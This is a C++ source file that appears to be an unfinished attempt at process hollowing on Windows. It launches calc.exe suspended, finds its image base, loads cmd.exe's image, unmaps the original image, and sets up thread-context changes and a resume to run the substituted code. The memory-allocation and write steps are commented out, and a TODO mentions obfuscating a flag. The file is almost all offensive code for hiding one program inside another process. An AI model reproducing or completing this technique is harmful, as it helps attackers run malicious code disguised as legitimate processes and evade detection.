//
// Created by Kiku on 1/31/2022.
//

#include <fstream>
#include <iostream>
#include <windows.h>
#include <cstdio>
#include <tchar.h>
#include <psapi.h>
#include <winternl.h>
#include <strsafe.h>
#include <dbghelp.h>
#include <memoryapi.h>
#include <Memoryapi.h>



/* Define a function pointer for our imported
 * function.
 * This reads as "introduce the new type Q_process as the type:
 *                pointer to a function returning an NTSTATUS and
 *                taking no arguments.
 *
 * Make sure to use matching calling convention (__cdecl, __stdcall, ...)
 * with the exported function. __stdcall is the convention used by the WinAPI
 *
 * definition taken from https://stackoverflow.com/questions/8696653/dynamically-load-a-function-from-a-dll from Niklas B.'s Answer
 * modified of variables
 */
typedef NTSTATUS(__stdcall* Q_process)(HANDLE ProcessHandle, PROCESSINFOCLASS ProcessInformationClass, PVOID  ProcessInformation, ULONG  ProcessInformationLength, PULONG ReturnLength);
typedef NTSTATUS(__stdcall* Nt_Unmap)(HANDLE ProcessHandle, PVOID BaseAdress);
typedef PIMAGE_NT_HEADERS(__stdcall* ImageNtHead)(PVOID base);

void cleanup(PROCESS_INFORMATION* processToTerminate) {
	if (processToTerminate->hProcess)
	{
		TerminateProcess(processToTerminate->hProcess, 0);
		CloseHandle(processToTerminate->hProcess);
		CloseHandle(processToTerminate->hThread);
	}
	exit(0);
}

HANDLE startCalc() {
	PROCESS_INFORMATION processInformation;
	CreateProcessA(nullptr,
		"\"calc.exe\"",
		nullptr,
		nullptr,
		FALSE,
		CREATE_SUSPENDED, // 0 or CREATE_SUSPENDED TODO: obfuscate this to 0x00000004
		nullptr,
		nullptr,
		nullptr,
		&processInformation);
	return processInformation.hProcess;
}

void ErrorExit(LPTSTR lpszFunction)
{
	// Retrieve the system error message for the last-error code

	LPVOID lpMsgBuf;
	LPVOID lpDisplayBuf;
	DWORD dw = GetLastError();

	FormatMessage(
		FORMAT_MESSAGE_ALLOCATE_BUFFER |
		FORMAT_MESSAGE_FROM_SYSTEM |
		FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL,
		dw,
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
		(LPTSTR)&lpMsgBuf,
		0, NULL);

	// Display the error message and exit the process

	lpDisplayBuf = (LPVOID)LocalAlloc(LMEM_ZEROINIT,
		(lstrlen((LPCTSTR)lpMsgBuf) + lstrlen((LPCTSTR)lpszFunction) + 40) * sizeof(TCHAR));
	StringCchPrintf((LPTSTR)lpDisplayBuf,
		LocalSize(lpDisplayBuf) / sizeof(TCHAR),
		TEXT("%s failed with error %d: %s"),
		lpszFunction, dw, lpMsgBuf);
	MessageBox(NULL, (LPCTSTR)lpDisplayBuf, TEXT("Error"), MB_OK);

	LocalFree(lpMsgBuf);
	LocalFree(lpDisplayBuf);
	ExitProcess(dw);
}


void loadFunctions(Q_process& qproc, Nt_Unmap& ntUnmap, ImageNtHead& nth) {
	HMODULE ntdllHandle = LoadLibrary("NtDll.dll");
	HMODULE dbghelpdllHandle = LoadLibrary("Dbghelp.dll");

	if (!ntdllHandle) {
		printf("ntdll failed \n");
		cleanup(nullptr);
	}

	if (!dbghelpdllHandle) {
		printf("dbghelpdll failed \n");
		cleanup(nullptr);
	}

	nth = (ImageNtHead)GetProcAddress(dbghelpdllHandle, "ImageNtHeader");
	qproc = (Q_process)GetProcAddress(ntdllHandle, "NtQueryInformationProcess");
	ntUnmap = (Nt_Unmap)GetProcAddress(ntdllHandle, "NtUnmapViewOfSection");
	if (qproc == nullptr) {
		std::cout << "Error loading function NTQUERY";
		cleanup(nullptr);
	}

	if (ntUnmap == nullptr) {
		std::cout << "Error loading function NTUNMAP";
		cleanup(nullptr);
	}

	if (nth == nullptr) {
		std::cout << "Error loading function IMAGENTHEADER";
		cleanup(nullptr);
	}

	FreeLibrary(ntdllHandle);
	//FreeLibrary(dbghelpdllHandle);
}

HANDLE getheap() {
	return GetProcessHeap();
}

/**
	create sus process
	acquire its image with size
	load other program's exe file
	get its image
	carve out the sus process image
	insert new image
	resume

*/

int maain() {
	//define starting variables
	LPSTR susPath;
	HANDLE exeHandle;
	HANDLE susProcessHandle;
	STARTUPINFO startupinfo = STARTUPINFO();
	PROCESS_INFORMATION processInformation = PROCESS_INFORMATION(); // holder of the process data
	//remove data at the adresses so it doesnt have some weird interactions
	//ZeroMemory(&startupinfo, sizeof(STARTUPINFO));
	//ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
	auto* processBasicInformation = new PROCESS_BASIC_INFORMATION(); // holder of the process data
	DWORD retLength = 0;
	PVOID processTargetBaseAddress = nullptr;
	SIZE_T amountReadBytes = 0;
	Q_process NtQueryProcess{};
	Nt_Unmap NtUnmapView{};
	ImageNtHead ImageNtHeader{};
	NTSTATUS Status;
	loadFunctions(NtQueryProcess, NtUnmapView, ImageNtHeader);

#if defined(_WIN64)
	susPath = "c:\\windows\\Syswow64\\calc.exe";
#else
	susPath = "c:\\windows\\System32\\calc.exe";
#endif



	if (!CreateProcessA(nullptr,
		susPath, // yes id love to use just calc.exe here but i wouldnt recieve the PROCESS_VM_READ permission
		nullptr,
		nullptr,
		FALSE,
		CREATE_SUSPENDED, // 0 or CREATE_SUSPENDED TODO: obfuscate this to 0x00000004
		nullptr,
		nullptr,
		&startupinfo,
		&processInformation)) {
		std::cout << "An error occured while starting the process";
		ErrorExit("CreateProcessA");
	}
	susProcessHandle = processInformation.hProcess;


	//this ensures that our program will work on x64 and x32

	DWORD dwResult;
#if defined(_WIN64) 
	WOW64_CONTEXT context = WOW64_CONTEXT();
	context.ContextFlags = CONTEXT_INTEGER;
	dwResult = Wow64GetThreadContext(processInformation.hThread, &context);
#else 
	CONTEXT context = CONTEXT();
	context.ContextFlags = CONTEXT_INTEGER;
	dwResult = GetThreadContext(processInformation.hThread, &context);
#endif


	//Getting the right PEB; to this day i have no idea why the NtQueryInformationProcess doesnt work as intended
	// moving it by 8 bytes so we can read the ImageAdress
	DWORD pebImageBaseAdress = context.Ebx + 8;

	//PEB* pebImageBaseAdress = processBasicInformation->PebBaseAddress;
	LPVOID imageBaseDest = 0;
	if (!ReadProcessMemory(susProcessHandle,
		(LPVOID)pebImageBaseAdress,
		&imageBaseDest,
		sizeof(DWORD),
		&amountReadBytes
	)) {
		ErrorExit("ReadProcessMemory");
		return false;
	}
	//DWORD error = GetLastError();

	exeHandle = CreateFileA("C:/Windows/SysWow64/cmd.exe", GENERIC_READ, 0, nullptr, OPEN_ALWAYS, 0, nullptr);
	DWORD exeSize = GetFileSize(exeHandle, nullptr);
	LPVOID exeBytes = HeapAlloc(GetProcessHeap(),
		HEAP_ZERO_MEMORY, //we want the data we "reserve" to be 0's so we can write there without danger
		exeSize);
	ReadFile(exeHandle, exeBytes, exeSize,
		nullptr,
		nullptr); // we arent using any overlapped structures, nor we opened this file with FILE_FLAG_OVERLAPPED
	//lastly we need to get the image of the source process

	PIMAGE_NT_HEADERS exeNtHeaders = ImageNtHeader(exeBytes); // why cant i free this one's library i dont understanddd

	//now that we got the NT headers of a process, we can get the SizeOfImage from them -> need this to know how much memory to allocate in the shielding process (calc.exe)
	SIZE_T exeImageSize = exeNtHeaders->OptionalHeader.SizeOfImage;


	//Unmap the susProcess
	NtUnmapView(susProcessHandle, imageBaseDest);


	//TODO fix imageBaseDest not getting the right pointer


	// the new destination to image
	//unsigned long exeImageDest = VirtualAllocEx(susProcessHandle, imageBaseDest, exeImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); // look into using MEM_COMMIT | MEM_RESERVE as flAllocation type
	//if (!exeImageDest)
	//{
		ErrorExit("VirtualAllocEx");
	//}
	//get exeimagedest - exeNtheaders->Optionalheader.Imagebase
//	exeNtHeaders->OptionalHeader.ImageBase = (DWORD)exeImageDest;

	//finally write the process memory; TODO change exeImageDest to imageBaseDest
/*
	if (WriteProcessMemory(susProcessHandle, reinterpret_cast<LPVOID>(exeImageDest), exeBytes, exeNtHeaders->OptionalHeader.SizeOfHeaders, nullptr) == 0) {
		ErrorExit("WriteProcessMemory");
*/
//	}

	//now we have the image written in our susProcess, we still need to implement it so it gets executed

	//context.Eax = (DWORD)exeImageDest + exeNtHeaders->OptionalHeader.AddressOfEntryPoint;

#if defined(_WIN64)
	Wow64SetThreadContext(processInformation.hThread, &context);
#else 
	SetThreadContext(processInformation.hThread, &context);
#endif // defined(_WIN64)

	if (ResumeThread(processInformation.hThread) == -1) {
		ErrorExit("ResumeThread");
	}
	//IMAGE_FIRST_SECTION(xd)








	//release handles
	CloseHandle(processInformation.hProcess);
	CloseHandle(processInformation.hThread);

	cleanup(&processInformation);
	return 0;
}
